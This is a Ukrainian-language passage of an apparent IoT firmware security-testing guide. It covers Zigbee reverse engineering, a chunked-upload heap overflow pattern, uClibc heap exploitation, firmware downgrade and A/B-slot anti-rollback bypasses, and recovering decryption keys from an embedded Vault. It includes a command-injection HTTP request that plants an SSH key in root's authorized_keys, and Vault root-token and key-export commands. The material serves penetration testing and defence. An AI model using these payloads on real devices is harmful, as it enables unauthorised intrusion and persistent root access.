Аналіз під час виконання передбачає взаємодію з процесом або бінарним файлом у його робочому середовищі за допомогою таких інструментів, як gdb-multiarch, Frida і Ghidra, для встановлення точок зупинки та виявлення вразливостей за допомогою fuzzing та інших методів.

Для вбудованих цільових систем без повноцінного налагоджувача **скопіюйте на пристрій статично скомпонований `gdbserver`** і під’єднайтеся до нього віддалено:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Відображення повідомлень Zigbee / радіокопроцесора

У IoT-хабах стек RF часто розділений між **радіо MCU** та процесом Linux userland. Корисний робочий процес — відобразити шлях:<sup>[[8]](#references)</sup>

1. **RF frame** в ефірі
2. **парсер на стороні контролера** на радіо MCU
3. **текстовий або TLV-протокол через serial/UART**, що пересилається до Linux (наприклад, `/dev/tty*`)
4. **диспетчер застосунку** в основному daemon
5. **обробник / state machine для конкретного протоколу**

Така архітектура створює дві цілі для reverse engineering замість однієї. Якщо контролер перетворює бінарні радіокадри на текстовий протокол на кшталт `Group,Command,arg1,arg2,...`, відновіть:

- **групи повідомлень** і таблиці диспетчеризації
- Які повідомлення можуть надходити з **мережі**, а які — від самого контролера
- Точні **поля-дискримінатори для конкретного виробника** (наприклад, Zigbee `manufacturer_code` і власний `cluster_command`)
- Які обробники доступні лише під час **commissioning**, виявлення або завантаження прошивки/моделі

Для Zigbee перехопіть трафік спарювання та перевірте, чи ціль і досі використовує стандартний **Link Key** `ZigBeeAlliance09`. Якщо так, перехоплення трафіку commissioning може розкрити **Network Key**. Коди встановлення Zigbee 3.0 зменшують цей ризик, тож зафіксуйте, чи тестований пристрій справді вимагає їх використання.

### Обробники протоколів виробника та доступність, обмежена FSM

Власні команди Zigbee/ZCL часто є кращою ціллю, ніж стандартизовані кластери, оскільки вони передають дані до **власного коду парсингу** та внутрішніх **FSM**, перевірка яких менш ретельно перевірена.<sup>[[8]](#references)</sup>

Практичний робочий процес:

- Виконуйте reverse engineering диспетчера команд, доки не знайдете **обробник лише для команд виробника**.
- Відновіть таблиці **станів FSM**, **подій**, **перевірок**, **дій** і **наступних станів**.
- Визначте **перехідні стани**, що автоматично просуваються далі, а також гілки повторних спроб/помилок, які зрештою скидають або звільняють контрольований зловмисником стан.
- З’ясуйте, які легітимні обміни протоколу потрібні, щоб перевести daemon у вразливий стан, замість того щоб вважати, що вразливий обробник завжди доступний.

Для протоколів, чутливих до таймінгу, відтворення пакетів із Python-фреймворку може бути надто повільним. Надійніший підхід — емулювати легітимний пристрій на реальному обладнанні (наприклад, **nRF52840**) за допомогою стека виробничого класу, щоб оголосити потрібні **endpoints**, **attributes** і таймінги commissioning.

### Клас помилок у завантаженнях фрагментованих даних в embedded daemons

Поширений клас помилок прошивки трапляється під час **фрагментованого завантаження blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **Перший фрагмент** (`offset == 0`) зберігає `ctx->total_size` і виділяє пам’ять через `malloc(total_size)`.
2. Наступні фрагменти перевіряють лише контрольовані зловмисником **локальні для пакета** поля, як-от `packet_total_size >= offset + chunk_len`.
3. Копіювання виконується через `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки відповідності **початковому розміру виділеної пам’яті**.

Це дає змогу зловмиснику надіслати:

- Перший коректний фрагмент із **малим** заявленим загальним розміром, щоб змусити систему виділити невеликий блок heap.
- Пізніший фрагмент з **очікуваним offset**, але більшим `chunk_len`.
- Підроблений локальний розмір пакета, який проходить нові перевірки, але все одно переповнює початково виділений буфер.

Якщо вразливий шлях захищений логікою commissioning, для експлуатації потрібно достатньо **емуляції пристрою**, щоб перевести ціль у потрібний стан завантаження моделі або blob перед надсиланням некоректних фрагментів.

### Виклики `free()`, зумовлені протоколом

В embedded daemons найпростіший спосіб викликати експлуатацію метаданих heap — часто не «чекати на очищення», а **змусити протокол обробити помилку**:<sup>[[8]](#references)</sup>

- Надсилайте некоректні наступні фрагменти, щоб перевести FSM у стани **повторної спроби** або **помилки**.
- Перевищте поріг повторних спроб, щоб daemon **скинув контекст** і звільнив пошкоджений буфер.
- Використайте це передбачуване `free()`, щоб викликати примітиви на боці алокатора, перш ніж процес аварійно завершиться з інших причин.

Це особливо корисно проти алокаторів на кшталт **musl/uClibc/dlmalloc** в embedded Linux, де пошкодження метаданих chunk може перетворити логіку unlink/unbin на примітив запису. Стабільний шаблон — пошкодити **поле розміру**, щоб перенаправити обхід алокатора на **підроблені chunks, розміщені всередині переповненого буфера**, замість того щоб одразу перезаписати вказівники реальних bin і аварійно завершити процес.

## Бінарна експлуатація та Proof-of-Concept

Розробка PoC для виявлених вразливостей вимагає глибокого розуміння архітектури цілі та програмування мовами нижчого рівня. Захисти runtime для бінарних файлів в embedded-системах трапляються рідко, але коли вони присутні, можуть знадобитися такі техніки, як Return Oriented Programming (ROP).

### Нотатки щодо експлуатації fastbin у uClibc (embedded Linux)

- **Fastbins + консолідація:** uClibc використовує fastbins, подібні до glibc. Пізніше велике виділення пам’яті може викликати `__malloc_consolidate()`, тому будь-який підроблений chunk має пройти перевірки (коректний розмір, `fd = 0`, а сусідні chunks мають визначатися як «зайняті»).<sup>[[6]](#references)</sup>
- **Бінарні файли без PIE за увімкненого ASLR:** якщо ASLR увімкнено, але основний бінарний файл **не PIE**, адреси `.data/.bss` усередині бінарного файла стабільні. Можна спрямувати розміщення fastbin у область, що вже схожа на коректний заголовок heap chunk, щоб отримати виділення пам’яті в **таблиці вказівників на функції**.
- **NUL для зупинки парсера:** під час парсингу JSON `\x00` у payload може зупинити парсинг, зберігши наступні контрольовані зловмисником байти для stack pivot/ROP-ланцюжка.
- **Shellcode через `/proc/self/mem`:** ROP-ланцюжок, що викликає `open("/proc/self/mem")`, `lseek()` і `write()`, може розмістити виконуваний shellcode у відомому відображенні пам’яті та передати на нього керування.

## Атаки зі зниженням версії прошивки та незахищені механізми оновлення

Навіть якщо виробник реалізує криптографічну перевірку підпису образів прошивки, **захист від повернення до старої версії (downgrade) часто відсутній**. Якщо boot- або recovery-loader лише перевіряє підпис за допомогою вбудованого відкритого ключа, але не порівнює *версію* (або монотонний лічильник) образу, який записується, зловмисник може легітимно встановити **старішу вразливу прошивку з дійсним підписом** і таким чином повернути вже виправлені вразливості.<sup>[[4]](#references)</sup>

Типовий сценарій атаки:

1. **Отримайте старіший підписаний образ**
   * Завантажте його з публічного порталу завантажень виробника, CDN або сайту підтримки.
   * Витягніть його із супутніх мобільних/настільних застосунків (наприклад, з `assets/firmware/` у Android APK).
   * Отримайте його зі сторонніх репозиторіїв, як-от VirusTotal, інтернет-архіви, форуми тощо.
2. **Завантажте образ на пристрій або надайте його йому** через будь-який доступний канал оновлення:
   * Web UI, API мобільного застосунку, USB, TFTP, MQTT тощо.
   * Багато споживчих IoT-пристроїв мають *неавтентифіковані* HTTP(S)-ендпоїнти, які приймають Base64-кодовані blobs прошивки, декодують їх на сервері та запускають recovery/оновлення.
3. Після downgrade експлуатуйте вразливість, яку виправили в новішому релізі (наприклад, фільтр command-injection, доданий пізніше).
4. За бажанням, після отримання persistence знову запишіть найновіший образ або вимкніть оновлення, щоб уникнути виявлення.

### Приклад: Command Injection після downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

У вразливій (пониженій до старішої версії) прошивці параметр `md5` безпосередньо конкатенується з командою оболонки без санітизації, що дає змогу ін’єктувати довільні команди (у цьому випадку — увімкнути доступ root на основі SSH-ключа). У пізніших версіях прошивки додали базову фільтрацію символів, але відсутність захисту від відкату зводить це виправлення нанівець.<sup>[[4]](#references)</sup>

### Витягування прошивки з мобільних застосунків

Багато виробників вбудовують повні образи прошивки у свої мобільні застосунки-компаньйони, щоб застосунок міг оновлювати пристрій через Bluetooth/Wi-Fi. Зазвичай ці пакети зберігаються в APK/APEX у незашифрованому вигляді за шляхами на кшталт `assets/fw/` або `res/raw/`. Інструменти на зразок `apktool`, `ghidra` або навіть звичайний `unzip` дають змогу витягувати підписані образи, не торкаючись фізичного обладнання.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Обхід anti-rollback лише через updater у конструкціях зі слотами A/B

Деякі виробники реалізують **ratchet** для захисту від downgrade, але лише в логіці *updater* (наприклад, у процедурі UDS через CAN, команді recovery або OTA-агенті в userspace). Якщо **bootloader** згодом перевіряє лише підпис/CRC образу та довіряє таблиці розділів або метаданим слотів, захист від rollback усе ще можна обійти.<sup>[[7]](#references)</sup>

Типова слабка конструкція:

- Метадані firmware містять і дескриптор версії, і **security ratchet** / монотонний лічильник.
- Updater порівнює ratchet образу зі значенням у постійному сховищі й відхиляє старіші підписані образи.
- Bootloader **не** розбирає цей ratchet і перед завантаженням вибраного слота перевіряє лише заголовок, CRC і підпис.
- Активація слота зберігається окремо — у таблиці розділів або лічильнику поколінь для кожного слота — і **не має криптографічного зв’язку** з точним digest перевіреної firmware.

У системах із двома слотами це створює примітив **«перевірити один образ / завантажити інший»**. Якщо зловмисник може змусити updater позначити слот B як наступну ціль завантаження за допомогою актуального підписаного образу, а потім перезаписати слот B до перезавантаження, bootloader усе одно може завантажити образ зі старішою версією, оскільки довіряє лише вже збереженим метаданим слота.

Поширений сценарій зловживання:

1. Завантажити **актуальну підписану** firmware у пасивний слот і запустити стандартну процедуру перевірки/перемикання, щоб у розмітці цей слот став наступним активним.
2. **Поки що не перезавантажувати пристрій**. У тій самій сесії знову запустити процедуру підготовки/стирання слота.
3. Скористатися застарілим станом завантаження або логікою вибору слота, щоб updater стер **той самий фізичний слот**, який щойно активував.
4. Записати в цей слот **старішу, але досі підписану** firmware.
5. Пропустити процедуру перевірки, яка застосовує ratchet, і одразу перезавантажити пристрій.
6. Bootloader вибирає активований слот, перевіряє лише підпис/цілісність і завантажує старий образ.

Під час reverse engineering реалізацій оновлення A/B звертайте увагу на таке:

- Вибір слота залежить від **прапорців часу завантаження**, які не оновлюються після успішного перемикання.
- Процедура на кшталт `prepare_passive_slot()` стирає слот на основі застарілого стану, а не **поточної зафіксованої розмітки**.
- Функція на кшталт `part_write_layout()` лише збільшує **лічильник поколінь** / встановлює прапорець активності й не зберігає хеш перевіреного образу.
- Перевірки ratchet реалізовані в userspace або коді updater, але **відсутні** в ROM / bootloader / етапах secure boot.
- Процедури стирання або recovery залишають слот позначеним як придатний до завантаження, навіть після видалення та повторного запису його вмісту.

### Контрольний список для оцінювання логіки оновлення

* Чи належно захищені транспорт і автентифікація *endpoint оновлення* (TLS + автентифікація)?
* Чи порівнює пристрій **номери версій** або **монотонний лічильник anti-rollback** перед прошиванням?
* Чи перевіряється образ у межах ланцюжка secure boot (наприклад, підписи перевіряє код ROM)?
* Чи застосовує **bootloader той самий ratchet**, що й updater, замість перевірки лише підпису/CRC?
* Чи прив’язані метадані активації слота **до digest/версії перевіреної firmware**, чи слот можна змінити після активації?
* Після успішного перемикання слота пристрій примусово перезавантажується чи в тій самій сесії залишаються доступними подальші процедури оновлення/стирання?
* Чи виконує код userland додаткові перевірки коректності (наприклад, дозволеної карти розділів, номера моделі)?
* Чи повторно використовують *часткові* або *резервні* сценарії оновлення ту саму логіку перевірки?

> 💡  Якщо чогось із переліченого бракує, платформа, ймовірно, вразлива до атак rollback.

## Відновлення ключів розшифрування firmware зі стану вбудованого KMS/Vault

Якщо образ оновлення містить невеликі метадані у відкритому вигляді та великий блок із високою ентропією, спершу проаналізуйте контейнер, а не беріться за перебір:<sup>[[1]](#references)</sup>

- Виведіть заголовки, зсуви та межі рядків за допомогою `hexdump`, `xxd`, `strings -tx`, `base64 -d` і `binwalk -E`.
- `Salted__` зазвичай означає формат OpenSSL `enc`: наступні 8 байтів — це сіль, решта — шифротекст.
- Поле Base64, яке після декодування містить рівно `256` байтів, — вагома ознака того, що перед вами шифротекст RSA-2048, яким зашифровано випадковий пароль firmware/ключ сеансу.
- Вбудовані в той самий файл відокремлені дані PGP часто захищають лише автентичність; не припускайте, що саме вони забезпечують конфіденційність.

Якщо пошук статичних ключів (`grep`, `strings`, пошук PEM/PGP) не дав результатів, дослідіть **операційний шлях розшифрування**, а не лише шукайте приватні ключі:

- Декомпілюйте updater / бінарний файл керування й простежте, хто читає зашифрований блок, який helper/API його розпаковує та яке логічне ім’я ключа він запитує.
- Шукайте стан KMS у витягнутій кореневій файловій системі (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), а також файли unit і init-скрипти.
- Вважайте команди `vault operator unseal ...` у відкритому вигляді, ключі відновлення, bootstrap-токени або локальні скрипти автоматичного unseal KMS еквівалентом матеріалу приватного ключа.

Якщо пристрій постачається з оригінальним бінарним файлом Vault і бекендом сховища, зазвичай простіше відтворити це середовище, ніж повторно реалізовувати внутрішню логіку Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

З root-доступом до клонованого KMS:

- Зробіть ключі transit експортованими лише в ізольованому клоні: `vault write transit/keys/<name>/config exportable=true`
- Експортуйте ключ unwrap: `vault read transit/export/encryption-key/<name>`
- Спробуйте відновлений RSA-ключ із точною парою padding/hash, яку використовує KMS. Невдала спроба розшифрування PKCS#1 v1.5 і невдала спроба розшифрування з OAEP за замовчуванням **не** доводять, що ключ неправильний: у багатьох потоках на базі Vault використовується OAEP із SHA-256, тоді як поширені бібліотеки за замовчуванням використовують SHA-1.
- Якщо payload починається з `Salted__`, точно відтворіть KDF OpenSSL від виробника (`EVP_BytesToKey`, на старих пристроях часто MD5), перш ніж намагатися розшифрувати AES-CBC.

Так «зашифрована прошивка» перетворюється на загальнішу задачу: **відновити операційні ключі на стороні пристрою, а потім офлайн відтворити точні параметри unwrap + KDF**.
